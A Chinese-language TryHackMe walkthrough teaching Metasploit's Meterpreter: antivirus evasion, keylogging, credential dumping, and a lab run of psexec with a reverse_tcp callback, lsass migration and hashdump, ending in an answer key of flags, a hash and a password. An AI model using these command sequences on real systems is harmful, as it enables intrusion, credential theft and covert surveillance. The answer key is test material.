---
description: 本文的相关内容：深入了解Meterpreter，了解如何将基于内存的有效载荷(payload)用于后渗透中的漏洞利用攻击。
cover: ../../.gitbook/assets/metasploit.png
coverY: 0
layout:
  cover:
    visible: true
    size: hero
  title:
    visible: true
  description:
    visible: true
  tableOfContents:
    visible: true
  outline:
    visible: true
  pagination:
    visible: true
---

# Metasploit Meterpreter(Meterpreter使用)

TryHackMe实验房间链接：[https://tryhackme.com/room/meterpreter](https://tryhackme.com/room/meterpreter)

## Meterpreter简介

Meterpreter 是一种 Metasploit 上的有效负载（payload），它通过许多有价值的组件支持渗透测试过程。Meterpreter 将在目标系统上运行并充当命令和控制架构中的代理。

使用Meterpreter时，你将与目标操作系统和文件进行交互，并能使用 Meterpreter 的专用命令。Meterpreter 有许多版本，它们将根据目标系统提供不同的功能。

在kali中使用以下命令安装msf：

```shell
apt-get install metasploit-framework #安装msf框架
```

**Meterpreter 是如何工作的？**

Meterpreter 在目标系统上运行，但并不是安装在目标系统上，它在内存中运行，且不会将自身信息写入目标上的磁盘，此功能是为了 避免在防病毒扫描期间被检测到。

在默认情况下，大多数防病毒软件会扫描磁盘上的新文件（例如，当你从 Internet 下载文件时），而Meterpreter 在内存（RAM - 随机存取内存）中运行，以避免将文件写入到目标系统的磁盘上（例如生成meterpreter.exe）。

通过这种运行方式，Meterpreter 将被视为一个进程，并且不会在目标系统上生成文件。

Meterpreter 还旨在通过与运行 Metasploit 的服务器（通常是你的攻击机器）进行加密通信，避免被基于网络的 IPS（入侵防御系统）和 IDS（入侵检测系统）检测到。

如果目标组织不解密和检查进出本地网络的加密流量（例如 HTTPS），IPS 和 IDS 解决方案将无法检测到Meterpreter的活动。

虽然 Meterpreter 已能够被主要防病毒软件识别，但此加密通信功能提供了一定程度上的隐蔽性。

下面的示例显示了使用 MS17-010 漏洞进行漏洞利用的目标 Windows 机器，你将看到 Meterpreter 正在以 1304 的进程 ID (PID) 运行，在你进行实际操作的情况下，此 PID 会有所不同。

我们使用了 getpid 命令，它将返回一个运行 Meterpreter 的进程 ID，操作系统使用进程 ID（或进程标识符）来标识正在运行的进程。在 Linux 或 Windows 中运行的所有进程都将具有唯一的 ID 号，此编号可用于在需要时 与进程发生交互（例如：如果需要停止进程，则可以指定ID号停止对应的进程）。

```shell
meterpreter > getpid 
Current pid: 1304
```

如果我们使用 ps 命令列出目标系统上运行的进程，我们会看到 PID 1304 是 spoolsv.exe 而不是 Meterpreter.exe，正如人们所期望的那样。

```shell
meterpreter > ps

Process List
============

 PID   PPID  Name                  Arch  Session  User                          Path
 ---   ----  ----                  ----  -------  ----                          ----
 0     0     [System Process]                                                   
 4     0     System                x64   0                                      
 396   644   LogonUI.exe           x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\LogonUI.exe
 416   4     smss.exe              x64   0        NT AUTHORITY\SYSTEM           \SystemRoot\System32\smss.exe
 428   692   svchost.exe           x64   0        NT AUTHORITY\SYSTEM           
 548   540   csrss.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 596   540   wininit.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\wininit.exe
 604   588   csrss.exe             x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\csrss.exe
 644   588   winlogon.exe          x64   1        NT AUTHORITY\SYSTEM           C:\Windows\system32\winlogon.exe
 692   596   services.exe          x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\services.exe
 700   692   sppsvc.exe            x64   0        NT AUTHORITY\NETWORK SERVICE  
 716   596   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\lsass.exe 
 1276  1304  cmd.exe               x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\cmd.exe
 1304  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe
 1340  692   svchost.exe           x64   0        NT AUTHORITY\LOCAL SERVICE    
 1388  548   conhost.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\system32\conhost.exe
```

即使我们更进一步，查看 Meterpreter 进程（在本例中为 PID 1304）使用的 DLL（动态链接库），我们仍然不会发现任何东西（例如，没有meterpreter.dll）

```shell
C:\Windows\system32>tasklist /m /fi "pid eq 1304"
tasklist /m /fi "pid eq 1304"

Image Name                     PID Modules                                     
========================= ======== ============================================
spoolsv.exe                   1304 ntdll.dll, kernel32.dll, KERNELBASE.dll,    
                                   msvcrt.dll, sechost.dll, RPCRT4.dll,        
                                   USER32.dll, GDI32.dll, LPK.dll, USP10.dll,  
                                   POWRPROF.dll, SETUPAPI.dll, CFGMGR32.dll,   
                                   ADVAPI32.dll, OLEAUT32.dll, ole32.dll,      
                                   DEVOBJ.dll, DNSAPI.dll, WS2_32.dll,         
                                   NSI.dll, IMM32.DLL, MSCTF.dll,              
                                   CRYPTBASE.dll, slc.dll, RpcRtRemote.dll,    
                                   secur32.dll, SSPICLI.DLL, credssp.dll,      
                                   IPHLPAPI.DLL, WINNSI.DLL, mswsock.dll,      
                                   wshtcpip.dll, wship6.dll, rasadhlp.dll,     
                                   fwpuclnt.dll, CLBCatQ.DLL, umb.dll,         
                                   ATL.DLL, WINTRUST.dll, CRYPT32.dll,         
                                   MSASN1.dll, localspl.dll, SPOOLSS.DLL,      
                                   srvcli.dll, winspool.drv,                   
                                   PrintIsolationProxy.dll, FXSMON.DLL,        
                                   tcpmon.dll, snmpapi.dll, wsnmp32.dll,       
                                   msxml6.dll, SHLWAPI.dll, usbmon.dll,        
                                   wls0wndh.dll, WSDMon.dll, wsdapi.dll,       
                                   webservices.dll, FirewallAPI.dll,           
                                   VERSION.dll, FunDisc.dll, fdPnp.dll,        
                                   winprint.dll, USERENV.dll, profapi.dll,     
                                   GPAPI.dll, dsrole.dll, win32spl.dll,        
                                   inetpp.dll, DEVRTL.dll, SPINF.dll,          
                                   CRYPTSP.dll, rsaenh.dll, WINSTA.dll,        
                                   cscapi.dll, netutils.dll, WININET.dll,      
                                   urlmon.dll, iertutil.dll, WINHTTP.dll,      
                                   webio.dll, SHELL32.dll, MPR.dll,            
                                   NETAPI32.dll, wkscli.dll, PSAPI.DLL,        
                                   WINMM.dll, dhcpcsvc6.DLL, dhcpcsvc.DLL,     
                                   apphelp.dll, NLAapi.dll, napinsp.dll,       
                                   pnrpnsp.dll, winrnr.dll                     

C:\Windows\system32>
```

可用于检测 Meterpreter 的技术和工具超出了本文涉及的知识点范围。

本文旨在向你展示 Meterpreter 的隐蔽运行方式，但是请记住，大多数防病毒软件都会检测到它；另外值得注意的是，Meterpreter 会与攻击者的系统建立加密（TLS）通信通道。

## Meterpreter的特性

正如在之前的 Metasploit 知识点文章中所讨论的，Metasploit 有效载荷最初可以分为两类： 内联（也称为单）payload 和分阶段payload。

分阶段的payload分两步发送到目标机器，先装载初始部分（stager）的payload，再请求加载其余部分的payload，这允许存在较小的初始payload片段；而内联payload则是一次性全部发送。Meterpreter 有效载荷也分为分段和内联版本，但是，Meterpreter本身有多种不同的版本，你可以根据你的目标系统进行选择。

了解可用的 Meterpreter 版本的最简单方法是使用 msfvenom 列出它们，如下所示。

使用" msfvenom --list payloads " 命令再加上" | grep meterpreter " 筛选出meterpreter 类型的payload。

```shell
root@ip-10-10-186-44:~# msfvenom --list payloads | grep meterpreter
    android/meterpreter/reverse_http                    Run a meterpreter server in Android. Tunnel communication over HTTP
    android/meterpreter/reverse_https                   Run a meterpreter server in Android. Tunnel communication over HTTPS
    android/meterpreter/reverse_tcp                     Run a meterpreter server in Android. Connect back stager
    android/meterpreter_reverse_http                    Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_https                   Connect back to attacker and spawn a Meterpreter shell
    android/meterpreter_reverse_tcp                     Connect back to the attacker and spawn a Meterpreter shell
    apple_ios/aarch64/meterpreter_reverse_http          Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/aarch64/meterpreter_reverse_https         Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/aarch64/meterpreter_reverse_tcp           Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/armle/meterpreter_reverse_http            Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/armle/meterpreter_reverse_https           Run the Meterpreter / Mettle server payload (stageless)
    apple_ios/armle/meterpreter_reverse_tcp             Run the Meterpreter / Mettle server payload (stageless)
    java/meterpreter/bind_tcp                           Run a meterpreter server in Java. Listen for a connection
    java/meterpreter/reverse_http                       Run a meterpreter server in Java. Tunnel communication over HTTP
    java/meterpreter/reverse_https                      Run a meterpreter server in Java. Tunnel communication over HTTPS
    java/meterpreter/reverse_tcp                        Run a meterpreter server in Java. Connect back stager
    linux/aarch64/meterpreter/reverse_tcp               Inject the mettle server payload (staged). Connect back to the attacker
    linux/aarch64/meterpreter_reverse_http              Run the Meterpreter / Mettle server payload (stageless)
    linux/aarch64/meterpreter_reverse_https             Run the Meterpreter / Mettle server payload (stageless)
    linux/aarch64/meterpreter_reverse_tcp               Run the Meterpreter / Mettle server payload (stageless)
    linux/armbe/meterpreter_reverse_http                Run the Meterpreter / Mettle server payload (stageless)
    linux/armbe/meterpreter_reverse_https               Run the Meterpreter / Mettle server payload (stageless)
    linux/armbe/meterpreter_reverse_tcp                 Run the Meterpreter / Mettle server payload (stageless)
    linux/armle/meterpreter/bind_tcp                    Inject the mettle server payload (staged). Listen for a connection
    linux/armle/meterpreter/reverse_tcp                 Inject the mettle server payload (staged). Connect back to the attacker [...]
```

该列表将显示适用于以下平台的 Meterpreter 版本：

* Android
* Apple iOS
* Java
* Linux
* OSX
* PHP
* Python
* Windows

你决定使用哪个版本的 Meterpreter 将主要基于三个因素：

* 目标操作系统（目标操作系统是 Linux 还是 Windows？是 Mac 设备？是 Android 手机？等等）
* 目标系统上可用的组件（是否安装了 Python？这是一个 PHP 网站吗？等等）
* 你可以与目标系统建立的网络连接类型（它们允许原始 TCP 连接吗？你只能有一个 HTTPS 反向连接吗？IPv6 地址不像 IPv4 地址那样受到密切监控吗？等等）

如果你不使用 Meterpreter 作为由 Msfvenom 生成的独立有效载荷，你的payload选择也可能会受到漏洞exp的限制。

你会注意到一些漏洞exp具有默认的 Meterpreter 有效载荷，如下面示例中的 ms17\_010\_eternalblue 漏洞exp所示，它的默认payload就是meterpreter类型。

![image-20221005231417409](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221005231417409.png)

你可以在任意模块中使用 show payloads 命令，列出其他可用的有效载荷。

```shell
msf6 exploit(windows/smb/ms17_010_eternalblue) > show payloads 

Compatible Payloads
===================

   #   Name                                        Disclosure Date  Rank    Check  Description
   -   ----                                        ---------------  ----    -----  -----------
   0   generic/custom                                               manual  No     Custom Payload
   1   generic/shell_bind_tcp                                       manual  No     Generic Command Shell, Bind TCP Inline
   2   generic/shell_reverse_tcp                                    manual  No     Generic Command Shell, Reverse TCP Inline
   3   windows/x64/exec                                             manual  No     Windows x64 Execute Command
   4   windows/x64/loadlibrary                                      manual  No     Windows x64 LoadLibrary Path
   5   windows/x64/messagebox                                       manual  No     Windows MessageBox x64
   6   windows/x64/meterpreter/bind_ipv6_tcp                        manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager
   7   windows/x64/meterpreter/bind_ipv6_tcp_uuid                   manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 IPv6 Bind TCP Stager with UUID Support
   8   windows/x64/meterpreter/bind_named_pipe                      manual  No     Windows Meterpreter (Reflective Injection x64), Windows x64 Bind Named Pipe Stager [...]
```

## Meterpreter 中的命令

在任何已经成功建立的Meterpreter 会话中（命令提示符界面为 Meterpreter > ）输入help，将列出所有可用的命令（下图只显示出一部分命令）。

![image-20221005233850741](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221005233850741.png)

每个版本的 Meterpreter 都会有不同的命令选项，因此运行 help 命令总是一个好主意，这些命令是 Meterpreter 上可用的内置工具，它们将直接在目标系统上运行而无需加载任何额外的脚本或可执行文件。

Meterpreter 将为你提供三个主要类别的工具：

* 内置命令（Built-in commands）
* Meterpreter 工具（Meterpreter tools）
* Meterpreter 脚本（Meterpreter scripting）

当你输入" help "命令来查看命令列表时，你将看到 Meterpreter中的命令 被列举在不同的类别下：

* Core commands 核心命令
* File system commands 文件系统命令
* Networking commands 联网命令
* System commands 系统命令
* User interface commands 用户界面命令
* Webcam commands 网络摄像头命令
* Audio output commands 音频输出命令
* Elevate commands 提升命令
* Password database commands 密码数据库命令
* Timestomp commands 时间戳命令

请注意，上面的列表取自 Windows 版本的 Meterpreter (windows/x64/meterpreter/reverse\_tcp) 上的" help " 命令的输出结果，对于其他 Meterpreter 版本，这些命令列表将有所不同。

**Meterpreter 命令详解**

核心命令将有助于在目标系统上导航 并能与目标系统发生交互。下面是一些最常用的命令，在成功建立meterpreter会话之后，记得运行" help "命令来检查当前的meterpreter中的所有可用命令。

_Core commands 核心命令_

* `background`: 背景化当前会话
* `exit`: 终止 Meterpreter 会话
* `guid`: 获取会话 GUID (全局唯一标识符)
* `help`: 显示帮助菜单
* `info`:显示有关Post模块的信息
* `irb`: 在当前会话上打开交互式 Ruby shell
* `load`: 加载一个或多个 Meterpreter 扩展
* `migrate`: 允许你将 Meterpreter 迁移到另一个进程
* `run`:执行 Meterpreter 脚本或 Post 模块
* `sessions`: 快速切换到另一个会话

_File system commands 文件系统命令_

* `cd`: 将更改目录
* `ls`: 将在工作目录中列出文件(dir 也可以)
* `pwd`: 打印当前的工作目录
* `edit`: 将允许你编辑文件
* `cat`:将向屏幕显示文件的内容
* `rm`: 将删除指定的文件
* `search`: 将搜索文件
* `upload`: 将上传文件或目录
* `download`: 将下载文件或目录

_Networking commands 联网命令_

* `arp`: 显示主机 ARP (地址解析协议--Address Resolution Protocol)缓存
* `ifconfig`: 显示目标系统上可用的网络接口
* `netstat`: 显示网络连接
* `portfwd`: 将本地端口转发到远程服务
* `route`:允许你查看和修改路由表

_System commands 系统命令_

* `clearev`: 清除事件（event ）日志
* `execute`: 执行（execute）命令
* `getpid`: 显示当前的进程ID
* `getuid`: 显示正在运行 Meterpreter 的用户身份
* `kill`: 终止进程
* `pkill`:按名称终止进程
* `ps`: 列出正在运行的进程
* `reboot`: 重启远程计算机
* `shell`: 进入系统命令shell
* `shutdown`: 关闭远程计算机
* `sysinfo`:获取远程系统的信息，例如操作系统

_Others Commands 其他命令(这些命令将列在帮助菜单的不同菜单类别下)_

* `idletime`: 返回远程用户空闲的秒数
* `keyscan_dump`: 转储按键缓冲区
* `keyscan_start`: 开始捕捉按键
* `keyscan_stop`: 停止捕捉按键
* `screenshare`: 允许你实时监视远程用户的桌面
* `screenshot`: 抓取交互式桌面的屏幕快照
* `record_mic`: 从默认麦克风记录 X 秒的音频
* `webcam_chat`: 开始视频聊天
* `webcam_list`: 列出网络摄像头
* `webcam_snap`: 从指定的摄像头拍摄快照
* `webcam_stream`:播放指定摄像头的视频流
* `getsystem`:试图将你的权限提升到本地系统的权限
* `hashdump`: 转储 SAM 数据库的内容

尽管所有这些命令在帮助菜单下似乎都可用，但它们可能并不都有效。例如，目标系统可能没有网络摄像头，或者目标系统可以在没有适当桌面环境的虚拟机上运行。

## 使用 Meterpreter 进行后期利用

Meterpreter 为你提供了许多有用的命令，可以帮助你完成后期利用（后渗透）阶段，下面是一些你经常使用的例子。

**Help**

此命令将为你提供 Meterpreter 中所有可用命令的列表。正如我们之前看到的，Meterpreter 有很多版本，每个版本可能有不同的可用选项。一旦你成功建立了一个 Meterpreter 会话，输入help命令 将帮助你快速浏览可用的Meterpreter 命令。

![image-20221006092610159](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006092610159.png)

**Meterpreter 命令**

getuid 命令将显示当前正在运行 Meterpreter 的用户身份，这将使你了解你在目标系统上可能拥有的权限级别（例如，你是 NT AUTHORITY\SYSTEM 之类的管理员级别用户还是普通用户？）

![image-20221006092908433](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006092908433.png)

ps 命令将列出正在运行的进程，PID 列字段还将为你提供将 Meterpreter 迁移到另一个进程所需的 PID 信息。

![image-20221006093022019](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006093022019.png)

**Migrate（迁移）**

迁移到另一个进程将有助于 Meterpreter 与之交互。例如，如果你看到目标上运行的文字处理器（例如 word.exe、notepad.exe 等），你可以迁移到它并开始捕获用户发送到此进程的按键记录。某些 Meterpreter 版本将为你提供 keyscan\_start、keyscan\_stop 和 keyscan\_dump 命令选项，以使 Meterpreter 能够像键盘记录器一样工作。迁移到另一个进程也可以帮助你拥有更稳定的 Meterpreter 会话。

要迁移到其他任何进程，你需要输入 migrate 命令，后跟所需目标进程的 PID。 下面的示例显示 Meterpreter会话由当前进程 迁移到进程PID 716。

![image-20221006094016603](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006094016603.png)

注意：如果你从较高权限（例如 SYSTEM）用户迁移到由较低权限用户（例如 Web 服务器）启动的进程，你可能会失去你的用户权限而且你可能无法将它们取回。

**Hashdump**

hashdump 命令将列出 SAM 数据库的内容。SAM（安全帐户管理器--Security Account Manager）数据库在 Windows 系统上的作用是存储用户的密码，这些密码以 NTLM（新技术 LAN 管理器--New Technology LAN Manager）格式存储。

![image-20221006094632498](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006094632498.png)

虽然在数学上不可能“破解”这些哈希值，但是你仍然可以使用在线 NTLM 数据库或彩虹表攻击来获取明文密码。这些哈希值也可用于 Pass-the-Hash （哈希传递）攻击，以验证这些用户是否可以访问同一网络的其他系统。

**Search**

search命令对于定位具有潜在价值信息的文件很有用。在 CTF 的上下文环境中，这个命令可用于快速找到flag或证明文件，而在实际的渗透测试活动中，你可能需要搜索用户生成的文件或一些可能包含密码、帐户信息的配置文件。

![image-20221006100148525](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006100148525.png)

**Shell**

shell 命令将在目标系统上启动一个常规命令行 shell，按下 CTRL+Z 将帮助你返回至 Meterpreter shell。

![image-20221006100355193](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006100355193.png)

## 后渗透挑战

Meterpreter 提供了几个重要的后渗透工具。

前面提到的命令，例如 " getsystem " 和" hashdump " 将为权限提升和横向移动提供重要的杠杆和信息。基于Meterpreter，你可以使用它来运行 Metasploit 框架上一些可用的后渗透模块。最后，你还可以使用" load "命令来利用其他工具，例如 加载Kiwi或者加载整个 Python 语言。

![image-20221006101332177](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006101332177.png)

Meterpreter 具有一些功能，能够帮助完成 后渗透阶段的多个目标。

* 收集有关目标系统的更多信息。
* 在目标系统上寻找有价值的文件、寻找用户凭据、寻找额外的网络接口和一般信息。
* 权限提升。
* 横向移动。

使用 load 命令加载完任何其他工具后，你将在帮助菜单上看到一些新选项。下面的示例显示了添加Kiwi模块之后 产生的命令（先使用 load kiwi 命令）。

![image-20221006102155079](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006102155079.png)

在完成模块添加之后，meterpreter命令列表会根据load的菜单发生一些新的变化，请使用 help命令重新查看命令列表：

![image-20221006102555453](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006102555453.png)

答题

回答下面的问题将帮助你更好地了解 Meterpreter 如何在后渗透中使用。

你可以使用下面的凭据来模拟 针对SMB（服务器消息块）的初始攻击（使用 " exploit/windows/smb/psexec " 模块）

Username: ballen Password: Password1

RHOSTS：10.10.118.171

LHOSTS：10.10.34.130

首先建立一个meterpreter会话，使用以下命令：

```
msfconsole
search exploit/windows/smb/psexec
use 0        #使用默认的payload：windows/meterpreter/reverse_tcp
show options
set RHOSTS 10.10.118.171
set SMBPass Password1
set SMBUser ballen
exploit      #或者run
```

![image-20221006104837197](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006104837197.png)

![image-20221006104912478](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006104912478.png)

![image-20221006104936813](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006104936813.png)

输入命令查看目标计算机的名称：

```shell
sysinfo
```

![image-20221006105240454](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006105240454.png)

将会话后台化，并设置一个session ID （此处自动设置了编号为1），使用post模块提供的功能查看目标域：

```shell
background  #Backgrounding session 1...
use post/windows/gather/enum_domain
show options
set SESSION 1
run
```

![image-20221006110110764](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006110110764.png)

使用post模块提供的功能查看目标计算机用户创建的共享

```
use post/windows/gather/enum_shares
show options
set SESSION 1
run
```

![image-20221006110239966](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006110239966.png)

获取目标用户的hash密码，在 Meterpreter 提示符中: 首先迁移到“ lsass.exe”进程(ps 将列出其 PID) ，然后运行“ hashdump”。

```shell
sessions
sessions -i 1
ps    #找到lsass.exe进程对应的PID，这个进程的用户是 NT AUTHORITY\SYSTEM 有很高的权限
migrate 756 
hashdump
```

![image-20221006110856141](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006110856141.png)

![image-20221006111029932](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006111029932.png)

![image-20221006111756948](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006111756948.png)

![image-20221006111530713](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006111530713.png)

![image-20221006111620520](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006111620520.png)

找目标文件（已知文件名）并查看文件内容，使用以下命令

```shell
search -f secrets.txt     #search -f *.txt  文件较少时用*.txt   c:\Program Files (x86)\Windows Multimedia Platform\secrets.txt
search -f realsecret.txt  #search -f *.txt  文件较少时用*.txt   c:\inetpub\wwwroot\realsecret.txt
shell                     #使用shell命令进入目标系统的shell环境，方便进行cd--目录切换操作
cd c:\Program Files (x86)\Windows Multimedia Platform\
type secrets.txt
cd c:\inetpub\wwwroot\
type realsecret.txt
```

![image-20221006113256670](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006113256670.png)

![image-20221006113904772](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006113904772.png)

![image-20221006114125101](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006114125101.png)

**答题卡**

> ACME-TEST
>
> FLASH
>
> speedster
>
> 69596c7aa1e8daee17f8e78870e25a5c
>
> Trustno1
>
> c:\Program Files (x86)\Windows Multimedia Platform
>
> KDSvbsw3849
>
> c:\inetpub\wwwroot\\
>
> The Flash is the fastest man alive

![image-20221006114643787](C:%5CUsers%5CVimalano2ise%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20221006114643787.png)
